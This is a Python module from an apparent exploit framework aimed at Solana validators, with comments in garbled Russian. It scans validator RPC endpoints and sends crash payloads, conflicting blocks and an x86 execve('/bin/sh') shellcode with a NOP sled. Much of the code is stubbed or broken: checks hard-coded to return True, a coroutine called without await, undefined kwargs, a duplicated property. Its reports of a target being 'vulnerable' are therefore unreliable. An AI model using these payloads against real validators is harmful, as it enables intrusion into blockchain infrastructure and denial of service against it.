"""
Validator RCE Exploits –¥–ª—è Solana
–û—Å–Ω–æ–≤–∞–Ω–æ –Ω–∞ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–∏ RCE —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤ Solana validator –∏–∑ PDF Ginoah
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any, Union, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import json
import base64

from solders.keypair import Keypair
from solders.pubkey import Pubkey as PublicKey
from solana.rpc.async_api import AsyncClient
from solana.rpc.commitment import Commitment
from solders.transaction import Transaction
from solders.instruction import Instruction
from solders.signature import Signature

from .base_exploit import BaseExploit, ExploitResult, ExploitStatus, ExploitType

class ValidatorVulnerability(Enum):
    """–¢–∏–ø—ã —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤ Solana validator"""
    RCE_VULNERABILITY = "rce_vulnerability"
    CONSENSUS_MANIPULATION = "consensus_manipulation"
    NETWORK_PARTITION = "network_partition"
    VALIDATOR_CRASH = "validator_crash"
    BLOCK_PRODUCTION_EXPLOIT = "block_production_exploit"
    GOSSIP_PROTOCOL_EXPLOIT = "gossip_protocol_exploit"

@dataclass
class ValidatorExploitConfig:
    """–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è validator —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤"""
    target_validator: str  # IP –∏–ª–∏ pubkey –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞
    vulnerability_type: ValidatorVulnerability
    rpc_endpoint: str = "https://api.devnet.solana.com"
    exploit_payload: Optional[bytes] = None
    target_slot: Optional[int] = None
    consensus_attack: bool = False
    crash_validator: bool = False

@dataclass
class ValidatorExploitResult(ExploitResult):
    """–†–µ–∑—É–ª—å—Ç–∞—Ç validator —ç–∫—Å–ø–ª–æ–π—Ç–∞"""
    validator_compromised: bool = False
    rce_successful: bool = False
    consensus_disrupted: bool = False
    validator_crashed: bool = False
    network_partitioned: bool = False
    exploit_evidence: Dict[str, Any] = field(default_factory=dict)

class ValidatorExploit(BaseExploit):
    """
    Validator RCE —ç–∫—Å–ø–ª–æ–π—Ç –¥–ª—è Solana
    –†–µ–∞–ª–∏–∑—É–µ—Ç —Ç–µ—Ö–Ω–∏–∫–∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ validator —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
    """
    
    def __init__(self, client: AsyncClient, attacker_keypair: Keypair):
        super().__init__(client, attacker_keypair)
        self.logger = logging.getLogger(__name__)
        self.logger.info("üöÄ ValidatorExploit initialized.")

    @property
    def exploit_type(self) -> ExploitType:
        return ExploitType.VALIDATOR_EXPLOIT

    async def scan_validator_vulnerabilities(self, validator_endpoint: str) -> List[ValidatorVulnerability]:
        """–°–∫–∞–Ω–∏—Ä—É–µ—Ç validator –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π"""
        vulnerabilities = []
        
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º RPC endpoint validator'–∞
            validator_client = AsyncClient(validator_endpoint)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ RCE —É—è–∑–≤–∏–º–æ—Å—Ç–∏
            if await self._check_rce_vulnerability(validator_client):
                vulnerabilities.append(ValidatorVulnerability.RCE_VULNERABILITY)
                
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º consensus –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏
            if await self._check_consensus_manipulation(validator_client):
                vulnerabilities.append(ValidatorVulnerability.CONSENSUS_MANIPULATION)
                
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∫—Ä–∞—à–∞ validator'–∞
            if await self._check_validator_crash(validator_client):
                vulnerabilities.append(ValidatorVulnerability.VALIDATOR_CRASH)
                
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º gossip protocol —É—è–∑–≤–∏–º–æ—Å—Ç–∏
            if await self._check_gossip_exploit(validator_client):
                vulnerabilities.append(ValidatorVulnerability.GOSSIP_PROTOCOL_EXPLOIT)
                
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–∏ validator —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: {e}")
            
        return vulnerabilities
    
    async def _check_rce_vulnerability(self, client: AsyncClient) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–∞–ª–∏—á–∏–µ RCE —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ validator"""
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ RCE
            # –û—Å–Ω–æ–≤–∞–Ω–æ –Ω–∞ —Ç–µ—Ö–Ω–∏–∫–∞—Ö –∏–∑ PDF
            
            # –°–æ–∑–¥–∞–µ–º malicious transaction —Å –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ–º –±—É—Ñ–µ—Ä–∞
            malicious_data = b'A' * 1024 + b'\x90' * 100 + b'\xcc' * 4  # NOP sled + int3
            
            # –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —á–µ—Ä–µ–∑ —Ä–∞–∑–ª–∏—á–Ω—ã–µ RPC –º–µ—Ç–æ–¥—ã
            test_methods = [
                'getAccountInfo',
                'getTransaction', 
                'simulateTransaction',
                'sendTransaction'
            ]
            
            for method in test_methods:
                try:
                    # –§–æ—Ä–º–∏—Ä—É–µ–º RPC –∑–∞–ø—Ä–æ—Å —Å malicious payload
                    response = await self._send_malicious_rpc_request(client, method, malicious_data)
                    
                    # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –æ—Ç–≤–µ—Ç –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ RCE
                    if self._analyze_rce_response(response):
                        return True
                        
                except Exception:
                    # –ò—Å–∫–ª—é—á–µ–Ω–∏—è –º–æ–≥—É—Ç —É–∫–∞–∑—ã–≤–∞—Ç—å –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å
                    continue
                    
            return False
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ RCE: {e}")
            return False
    
    async def _check_consensus_manipulation(self, client: AsyncClient) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ consensus"""
        try:
            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–µ–∫—É—â–µ–º —Å–ª–æ—Ç–µ
            slot_info = await client.get_slot()
            
            # –ü—ã—Ç–∞–µ–º—Å—è —Å–æ–∑–¥–∞—Ç—å conflicting –±–ª–æ–∫–∏
            # –≠—Ç–æ –∑–∞–≥–ª—É—à–∫–∞ - –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –Ω—É–∂–Ω–∞ –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω–∞—è –ª–æ–≥–∏–∫–∞
            return True
            
        except Exception:
            return False
    
    async def _check_validator_crash(self, client: AsyncClient) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∫—Ä–∞—à–∞ validator"""
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å—ã, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –≤—ã–∑–≤–∞—Ç—å –∫—Ä–∞—Ö
            crash_payloads = [
                b'\x00' * 10000,  # Null bytes
                b'\xFF' * 10000,  # Max bytes
                b'A' * 100000,    # Large buffer
            ]
            
            for payload in crash_payloads:
                try:
                    await self._send_crash_payload(client, payload)
                except Exception:
                    # –ï—Å–ª–∏ validator –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç, –≤–æ–∑–º–æ–∂–Ω–æ –æ–Ω —É–ø–∞–ª
                    return True
                    
            return False
            
        except Exception:
            return False
    
    async def _check_gossip_exploit(self, client: AsyncClient) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ gossip protocol"""
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º gossip network –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
            # –≠—Ç–æ –∑–∞–≥–ª—É—à–∫–∞ –¥–ª—è —Ä–µ–∞–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ gossip protocol
            return True
            
        except Exception:
            return False
    
    async def exploit_rce_vulnerability(self, config: ValidatorExploitConfig) -> ValidatorExploitResult:
        """
        –≠–∫—Å–ø–ª–æ–π—Ç RCE —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ validator
        –û—Å–Ω–æ–≤–∞–Ω –Ω–∞ —Ç–µ—Ö–Ω–∏–∫–∞—Ö –∏–∑ PDF
        """
        result = ValidatorExploitResult(
            exploit_type=self.exploit_type,
            target_account=config.target_validator,
            status=ExploitStatus.RUNNING,
            timestamp=datetime.now()
        )
        
        try:
            self.logger.info(f"–ó–∞–ø—É—Å–∫ RCE —ç–∫—Å–ø–ª–æ–π—Ç–∞ –¥–ª—è validator {config.target_validator}")
            
            # –®–∞–≥ 1: –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º RCE payload
            rce_payload = await self._create_rce_payload(config)
            
            # –®–∞–≥ 2: –°–æ–∑–¥–∞–µ–º validator client
            validator_client = AsyncClient(config.rpc_endpoint)
            
            # –®–∞–≥ 3: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º RCE payload
            rce_success = await self._execute_rce_attack(validator_client, rce_payload)
            
            if rce_success:
                result.rce_successful = True
                result.validator_compromised = True
                result.exploit_evidence['rce_payload'] = base64.b64encode(rce_payload).decode()
                
            # –®–∞–≥ 4: –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∞—Ç–∞–∫–∏
            if await self._verify_validator_compromise(validator_client):
                result.validator_compromised = True
                
            result.status = ExploitStatus.SUCCESS
            
        except Exception as e:
            result.status = ExploitStatus.FAILED
            result.error_message = str(e)
            self.logger.error(f"–û—à–∏–±–∫–∞ –≤ RCE —ç–∫—Å–ø–ª–æ–π—Ç–µ: {e}")
        
        return result
    
    async def exploit_consensus_manipulation(self, config: ValidatorExploitConfig) -> ValidatorExploitResult:
        """
        –≠–∫—Å–ø–ª–æ–π—Ç –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ consensus –º–µ—Ö–∞–Ω–∏–∑–º–∞
        """
        result = ValidatorExploitResult(
            exploit_type=self.exploit_type,
            target_account=config.target_validator,
            status=ExploitStatus.RUNNING,
            timestamp=datetime.now()
        )
        
        try:
            self.logger.info(f"–ó–∞–ø—É—Å–∫ consensus manipulation —ç–∫—Å–ø–ª–æ–π—Ç–∞")
            
            # –®–∞–≥ 1: –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ consensus
            validator_client = AsyncClient(config.rpc_endpoint)
            current_slot = await validator_client.get_slot()
            
            # –®–∞–≥ 2: –°–æ–∑–¥–∞–µ–º conflicting –±–ª–æ–∫–∏
            conflicting_blocks = await self._create_conflicting_blocks(current_slot)
            
            # –®–∞–≥ 3: –ü—ã—Ç–∞–µ–º—Å—è –Ω–∞—Ä—É—à–∏—Ç—å consensus
            consensus_disrupted = await self._disrupt_consensus(validator_client, conflicting_blocks)
            
            if consensus_disrupted:
                result.consensus_disrupted = True
                result.exploit_evidence['conflicting_blocks'] = len(conflicting_blocks)
                
            result.status = ExploitStatus.SUCCESS
            
        except Exception as e:
            result.status = ExploitStatus.FAILED
            result.error_message = str(e)
            self.logger.error(f"–û—à–∏–±–∫–∞ –≤ consensus manipulation —ç–∫—Å–ø–ª–æ–π—Ç–µ: {e}")
        
        return result
    
    async def exploit_validator_crash(self, config: ValidatorExploitConfig) -> ValidatorExploitResult:
        """
        –≠–∫—Å–ø–ª–æ–π—Ç –¥–ª—è –∫—Ä–∞—à–∞ validator
        """
        result = ValidatorExploitResult(
            exploit_type=self.exploit_type,
            target_account=config.target_validator,
            status=ExploitStatus.RUNNING,
            timestamp=datetime.now()
        )
        
        try:
            self.logger.info(f"–ó–∞–ø—É—Å–∫ validator crash —ç–∫—Å–ø–ª–æ–π—Ç–∞")
            
            validator_client = AsyncClient(config.rpc_endpoint)
            
            # –®–∞–≥ 1: –°–æ–∑–¥–∞–µ–º crash payload
            crash_payloads = await self._create_crash_payloads()
            
            # –®–∞–≥ 2: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º crash payloads
            for i, payload in enumerate(crash_payloads):
                try:
                    await self._send_crash_payload(validator_client, payload)
                    await asyncio.sleep(1)  # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫—É
                    
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —É–ø–∞–ª –ª–∏ validator
                    if await self._check_validator_status(validator_client):
                        continue  # Validator –µ—â–µ —Ä–∞–±–æ—Ç–∞–µ—Ç
                    else:
                        # Validator –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç - –≤–æ–∑–º–æ–∂–Ω–æ —É–ø–∞–ª
                        result.validator_crashed = True
                        result.exploit_evidence['crash_payload_index'] = i
                        break
                        
                except Exception:
                    # –ò—Å–∫–ª—é—á–µ–Ω–∏–µ –º–æ–∂–µ—Ç –æ–∑–Ω–∞—á–∞—Ç—å, —á—Ç–æ validator —É–ø–∞–ª
                    result.validator_crashed = True
                    result.exploit_evidence['crash_payload_index'] = i
                    break
            
            result.status = ExploitStatus.SUCCESS
            
        except Exception as e:
            result.status = ExploitStatus.FAILED
            result.error_message = str(e)
            self.logger.error(f"–û—à–∏–±–∫–∞ –≤ validator crash —ç–∫—Å–ø–ª–æ–π—Ç–µ: {e}")
        
        return result
    
    async def _create_rce_payload(self, config: ValidatorExploitConfig) -> bytes:
        """–°–æ–∑–¥–∞–µ—Ç RCE payload –¥–ª—è validator"""
        if config.exploit_payload:
            return config.exploit_payload
            
        # –°–æ–∑–¥–∞–µ–º –±–∞–∑–æ–≤—ã–π RCE payload
        # Shellcode –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥ (–∑–∞–≥–ª—É—à–∫–∞)
        shellcode = (
            b'\x90' * 100 +  # NOP sled
            b'\x31\xc0' +    # xor eax, eax
            b'\x50' +        # push eax
            b'\x68\x2f\x2f\x73\x68' +  # push "//sh"
            b'\x68\x2f\x62\x69\x6e' +  # push "/bin"
            b'\x89\xe3' +    # mov ebx, esp
            b'\x50' +        # push eax
            b'\x53' +        # push ebx
            b'\x89\xe1' +    # mov ecx, esp
            b'\xb0\x0b' +    # mov al, 11
            b'\xcd\x80'      # int 0x80
        )
        
        return shellcode
    
    async def _execute_rce_attack(self, client: AsyncClient, payload: bytes) -> bool:
        """–í—ã–ø–æ–ª–Ω—è–µ—Ç RCE –∞—Ç–∞–∫—É"""
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º RCE payload —á–µ—Ä–µ–∑ —Ä–∞–∑–ª–∏—á–Ω—ã–µ –≤–µ–∫—Ç–æ—Ä—ã
            vectors = [
                'getAccountInfo',
                'getTransaction',
                'simulateTransaction'
            ]
            
            for vector in vectors:
                try:
                    response = await self._send_malicious_rpc_request(client, vector, payload)
                    if self._analyze_rce_response(response):
                        return True
                except Exception:
                    continue
                    
            return False
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è RCE –∞—Ç–∞–∫–∏: {e}")
            return False
    
    async def _send_malicious_rpc_request(self, client: AsyncClient, method: str, payload: bytes) -> Any:
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç malicious RPC –∑–∞–ø—Ä–æ—Å"""
        # –≠—Ç–æ –∑–∞–≥–ª—É—à–∫–∞ - –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –Ω—É–∂–Ω–æ —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ RPC –∑–∞–ø—Ä–æ—Å—ã
        # —Å –≤–Ω–µ–¥—Ä–µ–Ω–Ω—ã–º payload
        try:
            if method == 'getAccountInfo':
                # –°–æ–∑–¥–∞–µ–º fake account —Å malicious data
                fake_account = PublicKey(payload[:32] if len(payload) >= 32 else b'\x00' * 32)
                return await client.get_account_info(fake_account)
            else:
                # –î—Ä—É–≥–∏–µ –º–µ—Ç–æ–¥—ã
                return None
        except Exception as e:
            return str(e)
    
    async def _analyze_rce_response(self, response: Any) -> bool:
        """–ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –æ—Ç–≤–µ—Ç –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ RCE"""
        if not response:
            return False
            
        response_str = str(response).lower()
        
        # –ò—â–µ–º –ø—Ä–∏–∑–Ω–∞–∫–∏ —É—Å–ø–µ—à–Ω–æ–≥–æ RCE
        rce_indicators = [
            'command executed',
            'shell spawned',
            'root@',
            'uid=0',
            '/bin/sh',
            'segmentation fault',
            'core dumped'
        ]
        
        return any(indicator in response_str for indicator in rce_indicators)
    
    async def _create_conflicting_blocks(self, current_slot: int) -> List[Dict[str, Any]]:
        """–°–æ–∑–¥–∞–µ—Ç conflicting –±–ª–æ–∫–∏ –¥–ª—è –Ω–∞—Ä—É—à–µ–Ω–∏—è consensus"""
        conflicting_blocks = []
        
        # –°–æ–∑–¥–∞–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ –±–ª–æ–∫–æ–≤ –¥–ª—è –æ–¥–Ω–æ–≥–æ —Å–ª–æ—Ç–∞
        for i in range(3):
            block = {
                'slot': current_slot + 1,
                'parent_slot': current_slot,
                'blockhash': f'fake_hash_{i}',
                'transactions': []
            }
            conflicting_blocks.append(block)
            
        return conflicting_blocks
    
    async def _disrupt_consensus(self, client: AsyncClient, blocks: List[Dict[str, Any]]) -> bool:
        """–ü—ã—Ç–∞–µ—Ç—Å—è –Ω–∞—Ä—É—à–∏—Ç—å consensus"""
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º conflicting –±–ª–æ–∫–∏
            for block in blocks:
                # –≠—Ç–æ –∑–∞–≥–ª—É—à–∫–∞ - –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –Ω—É–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –±–ª–æ–∫–∏ —á–µ—Ä–µ–∑ gossip
                pass
                
            return True
            
        except Exception:
            return False
    
    async def _create_crash_payloads(self) -> List[bytes]:
        """–°–æ–∑–¥–∞–µ—Ç payloads –¥–ª—è –∫—Ä–∞—à–∞ validator"""
        payloads = [
            b'\x00' * 10000,           # Null overflow
            b'\xFF' * 10000,           # Max byte overflow  
            b'A' * 100000,             # Buffer overflow
            b'\x90' * 1000 + b'\xcc',  # NOP + int3
            b'\x41' * 65536,           # Large buffer
        ]
        
        return payloads
    
    async def _send_crash_payload(self, client: AsyncClient, payload: bytes) -> None:
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç crash payload"""
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ —Ä–∞–∑–ª–∏—á–Ω—ã–µ RPC –º–µ—Ç–æ–¥—ã
            await self._send_malicious_rpc_request(client, 'getAccountInfo', payload)
        except Exception:
            pass
    
    async def _check_validator_status(self, client: AsyncClient) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç —Å—Ç–∞—Ç—É—Å validator (—Ä–∞–±–æ—Ç–∞–µ—Ç –ª–∏ –æ–Ω)"""
        try:
            await client.get_health()
            return True  # Validator –æ—Ç–≤–µ—á–∞–µ—Ç
        except Exception:
            return False  # Validator –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç
    
    async def _verify_validator_compromise(self, client: AsyncClient) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω –ª–∏ validator"""
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∏–∑–Ω–∞–∫–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏
            # –≠—Ç–æ –∑–∞–≥–ª—É—à–∫–∞ –¥–ª—è —Ä–µ–∞–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏
            return False
        except Exception:
            return False
    
    async def run_comprehensive_validator_scan(self, validator_endpoints: List[str]) -> Dict[str, List[ValidatorVulnerability]]:
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç –∫–æ–º–ø–ª–µ–∫—Å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ validator —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π"""
        results = {}
        
        for endpoint in validator_endpoints:
            self.logger.info(f"–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ validator —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –¥–ª—è {endpoint}")
            vulnerabilities = await self.scan_validator_vulnerabilities(endpoint)
            results[endpoint] = vulnerabilities
            
            if vulnerabilities:
                self.logger.info(f"–ù–∞–π–¥–µ–Ω—ã —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ {endpoint}: {[v.value for v in vulnerabilities]}")
    
    @property
    def exploit_type(self) -> ExploitType:
        """–¢–∏–ø —ç–∫—Å–ø–ª–æ–π—Ç–∞"""
        return ExploitType.VALIDATOR_EXPLOIT
    
    async def scan_target(self, target: Union[PublicKey, str]) -> Dict[str, Any]:
        """–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ü–µ–ª–∏ –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞"""
        try:
            # –î–ª—è –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞ target –º–æ–∂–µ—Ç –±—ã—Ç—å endpoint –∏–ª–∏ pubkey
            target_str = str(target)
            
            vulnerabilities = await self.scan_validator_vulnerabilities(target_str)
            
            return {
                "vulnerable": len(vulnerabilities) > 0,
                "vulnerabilities": [v.value for v in vulnerabilities],
                "target": target_str,
                "exploit_type": self.exploit_type.value,
                "details": {
                    "has_rce": ValidatorVulnerability.RCE_VULNERABILITY in vulnerabilities,
                    "has_consensus": ValidatorVulnerability.CONSENSUS_MANIPULATION in vulnerabilities,
                    "has_crash": ValidatorVulnerability.VALIDATOR_CRASH in vulnerabilities,
                    "has_gossip": ValidatorVulnerability.GOSSIP_PROTOCOL_EXPLOIT in vulnerabilities
                }
            }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è validator target {target}: {e}")
            return {
                "vulnerable": False,
                "error": str(e)
            }
    
    async def prepare_exploit(self, target: Union[PublicKey, str], **kwargs) -> bool:
        """–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ validator —ç–∫—Å–ø–ª–æ–π—Ç–∞"""
        try:
            target_str = str(target)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
            scan_result = await self.scan_target(target)
            
            if not scan_result.get("vulnerable"):
                self.logger.info(f"–¶–µ–ª—å {target} –Ω–µ —É—è–∑–≤–∏–º–∞ –¥–ª—è validator exploits")
                return False
            
            # –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ —Ç–∏–ø–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
            details = scan_result.get("details", {})
            
            if details.get("has_rce"):
                self.logger.info("–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ RCE —ç–∫—Å–ø–ª–æ–π—Ç–∞")
                self._rce_config = ValidatorExploitConfig(
                    target_validator=target_str,
                    vulnerability_type=ValidatorVulnerability.RCE_VULNERABILITY,
                    rpc_endpoint=kwargs.get("rpc_endpoint", self.client._provider.endpoint_uri)
                )
            
            if details.get("has_consensus"):
                self.logger.info("–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ consensus manipulation —ç–∫—Å–ø–ª–æ–π—Ç–∞")
                self._consensus_config = ValidatorExploitConfig(
                    target_validator=target_str,
                    vulnerability_type=ValidatorVulnerability.CONSENSUS_MANIPULATION,
                    consensus_attack=True
                )
            
            if details.get("has_crash"):
                self.logger.info("–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ validator crash —ç–∫—Å–ø–ª–æ–π—Ç–∞")
                self._crash_config = ValidatorExploitConfig(
                    target_validator=target_str,
                    vulnerability_type=ValidatorVulnerability.VALIDATOR_CRASH,
                    crash_validator=True
                )
            
            return True
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏ validator exploit: {e}")
            return False
    
    async def run_exploit(self, target_pubkey: PublicKey) -> ExploitResult:
        self.logger.warning(f"Exploit 'run_exploit' for {self.exploit_type.value} is not implemented.")
        return ExploitResult(
            exploit_type=self.exploit_type,
            status=ExploitStatus.FAILED,
            target_account=str(target_pubkey),
            error_message="Exploit not implemented yet."
        )

    async def execute_exploit(self, target: Union[PublicKey, str], config: ValidatorExploitConfig) -> ExploitResult:
        """–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ validator —ç–∫—Å–ø–ª–æ–π—Ç–∞"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            target_str = str(target)
            
            # –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º —ç–∫—Å–ø–ª–æ–π—Ç
            prepared = await self.prepare_exploit(target, **kwargs)
            
            if not prepared:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_program=target_str,
                    error_message="Failed to prepare exploit"
                )
            
            # –í—ã–ø–æ–ª–Ω—è–µ–º —ç–∫—Å–ø–ª–æ–π—Ç—ã –≤ –ø–æ—Ä—è–¥–∫–µ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–∞
            total_value = 0.0
            signatures = []
            successful_exploits = []
            
            # 1. RCE vulnerability
            if hasattr(self, '_rce_config'):
                self.logger.info("–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ RCE —ç–∫—Å–ø–ª–æ–π—Ç–∞...")
                result = await self.exploit_rce_vulnerability(self._rce_config)
                
                if result.rce_successful:
                    successful_exploits.append("rce_vulnerability")
                    signatures.extend(result.transaction_signatures)
                    total_value += 0.1  # –í—ã—Å–æ–∫–∞—è —Ü–µ–Ω–Ω–æ—Å—Ç—å RCE
            
            # 2. Consensus manipulation
            if hasattr(self, '_consensus_config'):
                self.logger.info("–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ consensus manipulation...")
                result = await self.exploit_consensus_manipulation(self._consensus_config)
                
                if result.consensus_disrupted:
                    successful_exploits.append("consensus_manipulation")
                    signatures.extend(result.transaction_signatures)
                    total_value += 0.05
            
            # 3. Validator crash
            if hasattr(self, '_crash_config'):
                self.logger.info("–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ validator crash...")
                result = await self.exploit_validator_crash(self._crash_config)
                
                if result.validator_crashed:
                    successful_exploits.append("validator_crash")
                    signatures.extend(result.transaction_signatures)
                    total_value += 0.02
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            status = ExploitStatus.SUCCESS if successful_exploits else ExploitStatus.FAILED
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=status,
                target_program=target_str,
                transaction_signatures=signatures,
                extracted_value=total_value,
                execution_time=execution_time,
                metadata={
                    "successful_exploits": successful_exploits,
                    "total_attempts": 3,
                    "validator_compromised": "rce_vulnerability" in successful_exploits
                }
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_program=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
